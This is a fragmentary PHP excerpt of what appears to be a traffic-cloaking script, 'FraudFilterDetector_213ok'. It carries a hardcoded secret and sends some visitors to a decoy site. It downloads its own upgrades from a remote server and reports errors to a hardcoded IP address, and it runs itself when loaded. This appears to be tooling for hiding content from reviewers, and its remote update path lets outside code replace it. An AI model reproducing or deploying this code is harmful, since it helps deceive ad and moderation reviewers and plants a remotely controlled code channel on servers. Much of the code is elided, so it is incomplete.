...
class FraudFilterDetector_213ok {
    ...
    function isSignatureValid($sign, $time) {
        $str = '56af8d0a-1fdf-4a6c-8402-bae357b55900.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://www.eatingdisorderscoalition.org');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 56af8d0a-1fdf-4a6c-8402-bae357b55900',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 56af8d0a-1fdf-4a6c-8402-bae357b55900';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 56af8d0a-1fdf-4a6c-8402-bae357b55900';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=213ok&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_213ok = new FraudFilterDetector_213ok();
$fraudFilterDetector_213ok->check();
